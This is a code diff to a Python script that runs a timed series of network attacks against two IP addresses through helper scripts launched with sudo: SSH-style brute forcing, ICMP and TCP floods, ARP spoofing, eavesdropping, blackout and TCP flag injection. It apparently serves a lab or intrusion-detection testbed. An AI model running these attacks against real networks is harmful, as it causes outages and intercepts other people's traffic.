@@ -2,6 +2,9 @@ from datetime import datetime, timedelta
 import os
 import argparse
 import subprocess
+from time import sleep
+
+import tqdm
 
 import logging
 
@@ -30,39 +33,79 @@ def logger(level_name,message):
         else:
             logging.error(f"Invalid logging level: {level_name}")
             
-            
+def run_command(command):
+    try:
+        proc = subprocess.Popen(command, shell=True)
+        
+        total_seconds = int(TIME_DURATION.total_seconds())
+        
+        for _ in tqdm(range(total_seconds), desc="Attack duration", unit="s"):
+            sleep(1)
+        proc.kill()
+        proc.wait()
+        
+    except Exception as e:
+        logger('error', f"Error running command: {e}")
+    
+    return
+
+
 ## FLOODING ATTACKS            
 def bruteforce_char(ip_addr):
     
     command= f'sudo python3 bruteforce.py {ip_addr} sample_username'
-    
+    run_command(command)
     
     return
+    
 
 def dos_imcp(ip_addr):
+    
+    command = f'sudo python3 icmp_flood.py'
+    
+    run_command(command)
     
     return
 
 def dos_tcp(ip_addr):
     
+    command = f'sudo python3 tcp_flood.py'
+    
+    run_command(command)
+    
     return
     
     
 ## IMPERSONATION ATTACKS
-def arp_spoof(ip_addr):
+def arp_spoof(ip_addr1, ip_addr2):
+    
+    command = f'sudo python3 arp_spoof.py {ip_addr1} {ip_addr2} -i eth0'
+    
+    run_command(command)
         
     return
 
-def arp_eveadropping(ip_addr):
+def arp_eveadropping(ip_addr1, ip_addr2):
+        
+    command = f'sudo python3 arp_eavesdrop.py {ip_addr1} {ip_addr2} -r 5'
+    
+    run_command(command)
         
     return
 
 def arp_blackout(ip_addr):
+    command = f'sudo python3 arp_blackout.py {ip_addr}'
+    
+    run_command(command)
         
     return
 
 ## Injection ATTACKS
-def tcp_flag_injection():
+def tcp_flag_injection(ip_addr):
+    
+    command = f'sudo python3 tcp_flag.py {ip_addr} -f 19'
+    
+    run_command(command)
     
     return
 
@@ -165,8 +208,3 @@ if __name__ == "__main__":
     
     
     logger('info',f"Finished all attacks on {IP_ADDR_1} and {IP_ADDR_2} at {tock}")
-    
-    
-    
-    
-    
